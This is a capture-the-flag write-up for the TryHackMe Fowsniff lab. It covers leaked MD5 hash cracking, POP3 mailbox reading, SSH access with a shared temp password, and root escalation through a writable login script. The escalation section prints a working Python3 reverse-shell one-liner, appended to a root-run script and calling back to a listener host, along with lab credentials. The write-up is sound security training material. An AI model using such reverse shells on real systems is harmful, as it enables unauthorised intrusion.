```
 ███████╗ ██████╗ ██╗    ██╗███████╗███╗   ██╗██╗███████╗███████╗
 ██╔════╝██╔═══██╗██║    ██║██╔════╝████╗  ██║██║██╔════╝██╔════╝
 █████╗  ██║   ██║██║ █╗ ██║███████╗██╔██╗ ██║██║█████╗  █████╗
 ██╔══╝  ██║   ██║██║███╗██║╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝
 ██║     ╚██████╔╝╚███╔███╔╝███████║██║ ╚████║██║██║     ██║
 ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝
              TryHackMe: Fowsniff CTF
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-10 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~11 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80), POP3 (110), IMAP (143)
- [x] Feroxbuster: nothing actionable on the web server
- [x] OSINT: found leaked credential dump on the box's GitHub repo
- [x] Cracked all 9 MD5 hashes with John the Ripper
- [x] Metasploit POP3 login scanner: failed due to trailing spaces in wordlist
- [x] Manual Netcat POP3 login as `seina:scoobydoo2`
- [x] Read two emails: extracted SSH temp password `S1ck3nBluff+secureshell`
- [x] SSH login as `baksteen` using shared temp password
- [x] Identified `/opt/cube/cube.sh`: world-writable, runs as `root` on SSH login
- [x] Appended Python3 reverse shell to `cube.sh`
- [x] Caught root shell on Netcat listener
- [x] Retrieved flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🔍 OSINT: GitHub search for the company name
- 🔓 John the Ripper: MD5 hash cracking
- 🐉 Metasploit (`auxiliary/scanner/pop3/pop3_login`): POP3 credential testing
- 📬 Netcat: manual POP3 session and reverse shell listener
- 🔑 SSH: user shell access

---

## ⚡ TL;DR

OSINT on the company's GitHub revealed a posted credential dump with 9 MD5 hashes: all cracked in seconds. Manual POP3 login to `seina`'s inbox surfaced an internal email containing a shared SSH temp password. SSH in as `baksteen`, found `/opt/cube/cube.sh`: a world-writable script executed as `root` on every SSH login. Appended a Python3 reverse shell. Next login fired the shell; caught root.

---

## 📖 Introduction

Today's target is **Fowsniff CTF**: a fictional corporate box that opens with a refreshing twist: before touching a single port, the attack begins with a Google search. The company's own GitHub repository hosts a posted credential dump complete with nine MD5 hashes, a taunting message from the attacker, and all the usernames needed to start spraying POP3. Two emails later, a shared temp SSH password is sitting in the inbox. From there, a world-writable login script that runs as root turns the escalation into a one-liner. Fowsniff Corporation: delivering solutions, accepting consequences.

### Prerequisites

Readers are assumed to know:

- What OSINT is and how to search for a target's online presence
- How POP3 works and basic commands (`USER`, `PASS`, `LIST`, `RETR`)
- What MD5 hashing is and why unsalted MD5 is trivially crackable
- How a login banner script works and why world-write permission on it is critical

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.48.185.6 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |
| 110/tcp | POP3 | Dovecot pop3d |
| 143/tcp | IMAP | Dovecot imapd |

Four ports: the first time both POP3 and IMAP have appeared in this series. The box is running a full mail server stack alongside the usual SSH and HTTP. Feroxbuster found nothing useful on the web server: just a static corporate landing page for "Fowsniff Corp: Delivering Solutions." The interesting attack surface is the mail server.

### OSINT: GitHub Credential Leak

*(~5 mins into the box)*

**What is OSINT?** Open Source Intelligence: gathering information about a target from publicly available sources before touching any of their systems. For a corporate target, this means checking social media, GitHub, Pastebin, and breach databases for anything the company or its employees have inadvertently exposed.

Searching GitHub for "Fowsniff" surfaces the company's own repository, which contains a file called `fowsniff.txt`: a credential dump posted by attacker `B1gN1nj4`:

```
# fowsniff.txt (excerpt)
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

Nine username:MD5hash pairs. The file even helpfully notes the POP3 server is "WIDE OPEN." This is the entire attack surface handed to us before scanning a single port.

### MD5 Hash Cracking: John the Ripper

**Why is unsalted MD5 so weak for passwords?** MD5 was designed as a fast cryptographic hash: which makes it catastrophically bad for password storage. Modern hardware can compute billions of MD5 hashes per second. Without a salt (a unique random value mixed into each hash before hashing), identical passwords produce identical hashes, and precomputed rainbow tables can reverse them instantly. All nine hashes here fall to rockyou.txt in under a second.

*Saving the hashes and cracking them:*

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
# output
scoobydoo2   (seina)
orlando12    (parede)
apples01     (tegel)
skyler22     (baksteen)
mailcall     (mauer)
07011972     (sciana)
carp4ever    (mursten)
bilbo101     (mustikka)
8g 0:00:00:00 DONE: 8/9 cracked
```

Eight of nine cracked instantly. `stone`'s hash (`a92b8a29ef1183192e3d35187e0cfabd`) was not in rockyou.txt: *stone is the admin account and likely had a stronger password, or the hash is intentionally uncrackable in this box to direct attention elsewhere.*

### Cracked Credentials

| Username | Password |
| --- | --- |
| seina | scoobydoo2 |
| parede | orlando12 |
| tegel | apples01 |
| baksteen | skyler22 |
| mauer | mailcall |
| sciana | 07011972 |
| mursten | carp4ever |
| mustikka | bilbo101 |
| stone | *(not cracked)* |

---

## 🚪 Foothold

*(~15 mins into the box)*

### POP3 Login: Manual Netcat

With eight sets of credentials, the POP3 server is the natural next target. Metasploit's `auxiliary/scanner/pop3/pop3_login` was tried first but failed for every account: a subtle but instructive reason covered in Rabbit Holes below.

Manual Netcat confirmed login works cleanly:

*Connecting to POP3 and authenticating as `seina`:*

```bash
nc 10.48.185.6 110
```

```
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

*Listing and reading emails:*

```
STAT
+OK 2 2902
LIST
+OK 2 messages:
1 1622
2 1280
RETR 1
```

**Email 1**: from `stone@fowsniff` to all staff, subject: "URGENT! Security EVENT!":

The email explains the breach, announces a move to a temporary minimal server, and contains the critical line:

```
The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible...
```

**Email 2**: from `baksteen@fowsniff` to `seina`, casual banter about missing the management blowout, signed off as "Skyler": confirming `baksteen`'s real name and that they received Stone's email but hadn't read it yet. Notably: `baksteen`'s cracked POP3 password was `skyler22`: matching the name. They hadn't changed it. And now we know the SSH temp password too.

---

## 🐚 Shell / Access

*(~20 mins into the box)*

The temporary SSH password was sent to *all staff*. The most interesting account to try is `baksteen`: their POP3 password was already cracked, confirming they're a real active user, and their second email confirms they likely hadn't followed Stone's instructions to change it yet.

*SSH login as `baksteen` with the temp password:*

```bash
ssh baksteen@10.48.185.6
# Password: S1ck3nBluff+secureshell
```

```
   ****  Welcome to the Fowsniff Corporate Server! ****

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.

baksteen@fowsniff:~$
```

In as `baksteen`. The MOTD is practically a to-do list of things this user failed to do.

---

## 📈 Escalation

*(~22 mins into the box)*

### World-Writable Login Script: `/opt/cube/cube.sh`

`sudo -l` returned nothing for `baksteen`. SUID enumeration produced a clean standard list: no interpreter abuse available. The escalation path came from checking the `/opt/` directory:

```bash
ls -la /opt/cube
```

```
drwxrwxrwx 2 root   root  4096 Mar 11  2018 .         # ^^^ world-writable directory
-rw-rwxr-- 1 parede users  851 Mar 11  2018 cube.sh   # ^^^ writable by 'users' group
```

`cube.sh` is owned by `parede`, but the permissions `-rw-rwxr--` give the `users` group read+write+execute access. `baksteen` is a member of the `users` group:

```bash
id
# uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

**Why is this the escalation path?** The SSH login banner: the ASCII art Fowsniff logo shown on every login: is generated by `cube.sh`. This script runs as `root` on every SSH connection (it's part of the shell initialisation sequence via `/etc/profile` or equivalent). A world-writable script executed by root is equivalent to a root shell on demand: any code appended to it will run as root the next time it fires.

*Appending a Python3 reverse shell to `cube.sh`:*

```bash
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.133.233\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /opt/cube/cube.sh
```

*Setting up the listener on the attacking machine:*

```bash
nc -lnvp 1234
```

*Triggering the script by opening a new SSH session as `baksteen`:*

```bash
ssh baksteen@10.48.185.6
```

```
# listener catches connection
connect to [192.168.133.233] from (UNKNOWN) [10.48.185.6] 35900
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell landed via the login banner.

---

## 💥 Exploitation

The complete attack chain:

1. **OSINT on GitHub** → 9 username:MD5 hash pairs
2. **John the Ripper** cracked 8/9 hashes in under a second
3. **Manual POP3 login** as `seina:scoobydoo2` → two emails read
4. **Email from `stone`** → shared SSH temp password `S1ck3nBluff+secureshell`
5. **SSH as `baksteen`** using the temp password
6. **`/opt/cube/cube.sh`**: world-writable login script run as `root`
7. **Reverse shell appended** → next SSH login triggered it → root shell

---

## 🐇 Rabbit Holes

### Metasploit POP3 Scanner: Trailing Space Bug

`auxiliary/scanner/pop3/pop3_login` was configured with `usernames.txt` and `passes.txt` and failed on every single credential pair: including `seina:scoobydoo2` which was confirmed working manually moments later.

The reason: Metasploit read the passwords directly from the file including any trailing whitespace. The wordlist had been created with `cat << 'EOF'` and each line had trailing spaces after the password. Metasploit sent `scoobydoo2         ` (with trailing spaces) instead of `scoobydoo2`. Dovecot treated the spaces as part of the password string and rejected it.

The fix would have been trimming the wordlist with `sed 's/[[:space:]]*$//' passes.txt > passes_clean.txt` before feeding it to Metasploit. Manual Netcat doesn't suffer from this since you type the exact characters you intend.

### Trying SSH with POP3 Passwords Directly

Before reading the emails, all eight cracked POP3 passwords were tried against SSH. All failed: the POP3 credentials are email-only accounts and SSH uses a separate password database. The shared temp password only emerged from reading the internal email.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| Flag | `{REDACTED: retrieve from /root/flag.txt}` | `/root/flag.txt` |

*Note: The flag file wasn't captured in notes: retrieve it with `cat /root/flag.txt` once the root shell is established.*

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Credential dump posted to public GitHub | Critical | Treat any credential exposure as a full incident; rotate all affected passwords immediately; enable GitHub secret scanning alerts |
| Unsalted MD5 for password storage | Critical | Use bcrypt, Argon2, or PBKDF2 with a unique per-user salt; MD5 is not a password hashing algorithm |
| Shared temporary SSH password sent via email | High | Never distribute shared credentials over email; use individual key-based SSH access with forced key rotation |
| POP3/IMAP accessible from outside the network | High | Restrict mail server ports to internal network only; use VPN for remote access |
| World-writable login script executed as root | Critical | Never make root-executed scripts writable by non-root users; audit `/etc/profile.d/` and MOTD-related scripts regularly with `find / -perm -o+w -user root` |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** OSINT isn't just a pre-engagement formality: sometimes it hands you the entire credential set before you've touched a single port. Companies routinely leak sensitive information through GitHub repositories, Pastebin pastes, and public breach databases. Checking a target's online presence should always precede technical enumeration, because the attacker who already compromised them may have done half your work for you.

---

## 🔁 If I Did It Again

Clean the password wordlist before feeding it to Metasploit: `sed 's/[[:space:]]*$//'` takes two seconds and would have saved the manual Netcat detour. Also skip trying POP3 passwords against SSH and go straight to reading the inbox: the path from POP3 login to SSH temp password is one email read away.

---

## 🔚 Changelog

*Last updated: 2026-06-10*

---

[↑ Back to top](#)
